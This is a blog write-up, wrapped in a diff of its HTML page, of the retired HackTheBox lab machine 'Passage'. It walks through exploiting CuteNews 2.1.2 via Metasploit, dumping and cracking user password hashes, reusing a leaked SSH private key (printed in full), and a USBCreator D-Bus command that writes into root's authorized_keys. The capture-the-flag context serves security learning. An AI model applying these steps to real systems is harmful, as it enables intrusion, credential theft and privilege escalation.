@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Passage | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2021/03/htb-passage.html" title="Read more" class="entry-title-link">
+                HTB: Passage</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2021-03-09T09:20:00+01:00">09 Mar 2021</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 5 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2021.03/passage_card.png" alt="Passage Card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/275">Passage</a> publish on
+September 2, 2020 by
+<a href="https://www.hackthebox.eu/home/users/profile/140851">ChefByzen</a>.
+This box is rated as a medium box. It implies two public exploit and a shared SSH
+private key.</p>
+
+
+<h1 id="foothold">Foothold</h1>
+<h2 id="recon">Recon</h2>
+<p>Let us start as always by a <code>nmap</code> scan. Only port 80 (HTTP) and 22 (SSH) are
+open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Sun Sep 13 03:46:59 2020 as: nmap -p- -sSV -oN nmap 10.10.10.206</span>
+<span class="code-line">Nmap scan report for 10.10.10.206</span>
+<span class="code-line">Host is up (0.086s latency).</span>
+<span class="code-line">Not shown: 65533 closed ports</span>
+<span class="code-line">PORT   STATE SERVICE VERSION</span>
+<span class="code-line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span>
+<span class="code-line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span>
+<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="web">Web</h2>
+<p>We browse to the website. This is a simple blog with some news. One of them is
+about a <a href="https://www.fail2ban.org/wiki/index.php/Main_Page">fail2ban</a>
+implementation. This will dissuade us to brute force login interfaces (which
+rarely happen on HTB) and run <code>dirb</code> against the site.</p>
+<p><img alt="Passage News index" src="/media/2021.03/passage_01.png"></p>
+<p>When looking at the bottom of the page we see that the blog is "Powered by
+CuteNews". A few Google search lead us to the admin panel located at <code>/CuteNews</code></p>
+<p><img alt="Cute News login page" src="/media/2021.03/passage_02.png"></p>
+<p>We cannot login as we don't have any creds nor create an account.
+We also check the available exploit for this CuteNews version (2.1.2).</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ searchsploit CuteNews 2.1.2</span>
+<span class="code-line">----------------------------------------------------------- ---------------------------------</span>
+<span class="code-line">Exploit Title                                             |  Path</span>
+<span class="code-line">----------------------------------------------------------- ---------------------------------</span>
+<span class="code-line">CuteNews 2.1.2 - &#39;avatar&#39; Remote Code Execution (Metasploi | php/remote/46698.rb</span>
+<span class="code-line">CuteNews 2.1.2 - Arbitrary File Deletion                   | php/webapps/48447.txt</span>
+<span class="code-line">CuteNews 2.1.2 - Authenticated Arbitrary File Upload       | php/webapps/48458.txt</span>
+<span class="code-line">----------------------------------------------------------- ---------------------------------</span>
+<span class="code-line">Shellcodes: No Results</span>
+<span class="code-line"></code></pre></div>
+
+<p>We import the 'Avatar' exploit into metasploit using <a href="https://github.com/rapid7/metasploit-framework/wiki/Running-Private-Modules">rapid7 guide</a>.
+We register an account an launch the exploit and got a reverse shell as <code>www-data</code>.</p>
+<p>We look at the available files. We found the <code>cdata</code> folder just a level above
+and then the <code>users</code> directory. We display some of them. They contain base64
+encoded user data. Some of them contain a SHA256 hashed password.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat b0.php</span>
+<span class="code-line">&lt;?php die(&#39;Direct call - access denied&#39;); ?&gt;</span>
+<span class="code-line">YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTYwMDA4MDM1OSI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19</span>
+<span class="code-line"></span>
+<span class="code-line">a:1:{s:4:&quot;name&quot;;a:1:{s:10:&quot;paul-coles&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483236&quot;;s:4:&quot;name&quot;;s:10:&quot;paul-coles&quot;;s:3:&quot;acl&quot;;s:1:&quot;2&quot;;s:5:&quot;email&quot;;s:16:&quot;paul@passage.htb&quot;;s:4:&quot;nick&quot;;s:10:&quot;Paul Coles&quot;;s:4:&quot;pass&quot;;s:64:&quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485556&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}</span>
+<span class="code-line"></code></pre></div>
+
+<p>We grab all the hashes and crack them using <code>john</code> and the rockyou wordlist.
+<code>Paul</code>'s password is <code>atlanta1</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[maggick@fomalhaut ~]$ john hash -w=~/tools/password_lists/rockyou.txt --fork=8 --rules --format=Raw-SHA256</span>
+<span class="code-line">Using default input encoding: UTF-8</span>
+<span class="code-line">Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])</span>
+<span class="code-line">Warning: OpenMP was disabled due to --fork; a non-OpenMP build may be faster</span>
+<span class="code-line">Node numbers 1-8 of 8 (fork)</span>
+<span class="code-line">Each node loaded 1/8 of wordfile to memory (about 16 MB/node)</span>
+<span class="code-line">atlanta1         (paul)</span>
+<span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
+<span class="code-line">atlanta1         (paul)</span>
+<span class="code-line">atlanta1         (paul)</span>
+<span class="code-line">atlanta1         (paul)</span>
+<span class="code-line">Waiting for 7 children to terminate</span>
+<span class="code-line">Session completed</span>
+<span class="code-line"></code></pre></div>
+
+<p>We open a shell, and try to switch user but we cannot use <code>su</code> as we don't have
+a proper terminal. Using
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell">Payload all the things cheatsheet</a>
+we get an interactive shell and get logged in as <code>paul</code> and grab the user flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>meterpreter &gt; shell</span>
+<span class="code-line">Process 3053 created.</span>
+<span class="code-line">Channel 14 created.</span>
+<span class="code-line">  su </span>
+<span class="code-line">su: must be run from a terminal</span>
+<span class="code-line">/usr/bin/script -qc /bin/bash /dev/null                  </span>
+<span class="code-line">www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul</span>
+<span class="code-line">su paul</span>
+<span class="code-line">Password: atlanta1</span>
+<span class="code-line"></span>
+<span class="code-line">paul@passage:/var/www/html/CuteNews/cdata/users$ cd</span>
+<span class="code-line">cd</span>
+<span class="code-line">paul@passage:~$ cat user.txt</span>
+<span class="code-line">cat user.txt </span>
+<span class="code-line">c9e5ea0c3e42965404e9cf34eaee71bd</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="root">Root</h1>
+<p>We grab the SSH key in paul's <code>.ssh</code> folder. The associated public key show us
+that this is <code>nadav</code> public (and private) key.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat .ssh/id_rsa.pub</span>
+<span class="code-line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage</span>
+<span class="code-line">paul@passage:~$ cat .ssh/id_rsa</span>
+<span class="code-line">cat .ssh/id_rsa</span>
+<span class="code-line">-----BEGIN RSA PRIVATE KEY-----</span>
+<span class="code-line">MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/</span>
+<span class="code-line">+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i</span>
+<span class="code-line">Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt</span>
+<span class="code-line">rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ</span>
+<span class="code-line">JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok</span>
+<span class="code-line">sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ</span>
+<span class="code-line">eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG</span>
+<span class="code-line">QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr</span>
+<span class="code-line">lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh</span>
+<span class="code-line">zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz</span>
+<span class="code-line">R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k</span>
+<span class="code-line">7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio</span>
+<span class="code-line">GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4</span>
+<span class="code-line">IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE</span>
+<span class="code-line">LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR</span>
+<span class="code-line">AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0</span>
+<span class="code-line">VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt</span>
+<span class="code-line">1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0</span>
+<span class="code-line">KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1</span>
+<span class="code-line">9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF</span>
+<span class="code-line">d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs</span>
+<span class="code-line">nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY</span>
+<span class="code-line">f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM</span>
+<span class="code-line">Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs</span>
+<span class="code-line">OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==</span>
+<span class="code-line">-----END RSA PRIVATE KEY-----</span>
+<span class="code-line"></code></pre></div>
+
+<p>So we just us the SSH key to connect as <code>nadav</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ ssh -l nadav 10.10.10.206 -i .ssh/id_rsa-2</span>
+<span class="code-line">load pubkey &quot;.ssh/id_rsa-2&quot;: invalid format</span>
+<span class="code-line">Last login: Mon Sep 14 04:54:44 2020 from 10.10.14.5</span>
+<span class="code-line">nadav@passage:~$ id</span>
+<span class="code-line">uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span>
+<span class="code-line"></code></pre></div>
+
+<p>We look at the files in the home folder. In .viminfo we found that one of the
+latest edited file is about USBCreator.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Jumplist (newest first):</span>
+<span class="code-line">-&#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</span>
+<span class="code-line">-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</span>
+<span class="code-line"></code></pre></div>
+
+<p>A quick Google search lead us a <a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">blog post</a>
+with an USBCreator privilege escalation exploit allowing to write a file on the system as
+root. We reproduce the steps in order to copy <code>nadav</code>'s <code>authorized_keys</code> file in
+the <code>root</code>'s <code>.ssh</code> directory. We can then connect as <code>root</code> with our SSH key
+and get the flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true</span>
+<span class="code-line">()</span>
+<span class="code-line">nadav@passage:~$ logout</span>
+<span class="code-line">Connection to 10.10.10.206 closed.</span>
+<span class="code-line">kali@kali:~$ ssh -l nadav 10.10.10.206 -i .ssh/id_rsa-2</span>
+<span class="code-line">load pubkey &quot;.ssh/id_rsa-2&quot;: invalid format</span>
+<span class="code-line">Last login: Mon Sep 14 05:13:56 2020 from 127.0.0.1</span>
+<span class="code-line">nadav@passage:~$ logout</span>
+<span class="code-line">Connection to 10.10.10.206 closed.</span>
+<span class="code-line">kali@kali:~$ ssh -l root 10.10.10.206 -i .ssh/id_rsa-2</span>
+<span class="code-line">load pubkey &quot;.ssh/id_rsa-2&quot;: invalid format</span>
+<span class="code-line">Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1</span>
+<span class="code-line">root@passage:~# id</span>
+<span class="code-line">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="code-line">root@passage:~# cat root.txt o</span>
+<span class="code-line">db9c53fcf5bde2fa5a591bcb948a1d3a</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>This box was quit easy. Not to much rabbit hole. At the end this is just the
+chaining of two public exploits. I will recommend it for beginners.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2021/02/htb-academy.html"> HTB: Academy </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2021/04/htb-time.html"> HTB: Time </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
